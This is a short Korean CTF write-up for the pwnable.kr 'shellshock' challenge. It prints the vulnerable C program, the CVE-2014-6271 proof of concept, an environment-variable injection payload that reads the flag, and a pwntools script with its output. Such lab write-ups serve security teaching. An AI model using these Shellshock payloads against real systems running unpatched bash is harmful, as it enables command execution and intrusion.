# shellshock

## shellshock.c

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```
이 문제는 shellshock 취약점을 이용하는 문제다. uid, gid를 설정해주고 shellshock 취약점이 남아있는 구버전 `bash`로 `shock_me` 환경변수를 출력한다.

shellshock 취약점을 검색하면 나오는 poc코드는 아래와 같다.

```env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id```

이 취약점은 서브쉘을 실행할 때 환경변수를 파싱하는 과정에서 `()`로 시작하는 환경변수를 함수로 인식해 생기는 취약점이다.

이를 이용해 페이로드를 짜면 다음과 같다.

```env X=\'() { :;}; /bin/cat flag\' ./shellshock```

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

shell = ssh('shellshock', 'pwnable.kr', 2222, 'guest')

payload = 'env x=\'() { :;}; /bin/cat flag\' ./shellshock'

r = shell.run(payload)

r.recv()
```

```bash
[+] Connecting to pwnable.kr on port 2222: Done
[*] passcode@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.10.0
    ASLR:     Enabled
[+] Opening new channel: "stty raw -ctlecho -echo; cd . >/dev/null 2>&1;env x='() { :;}; /bin/cat flag' ./shellshock": Done
[DEBUG] Received 0x42 bytes:
    'only if I knew CVE-2014-6271 ten years ago..!!\n'
    'Segmentation fault\n'
[*] Closed SSH channel with pwnable.kr
```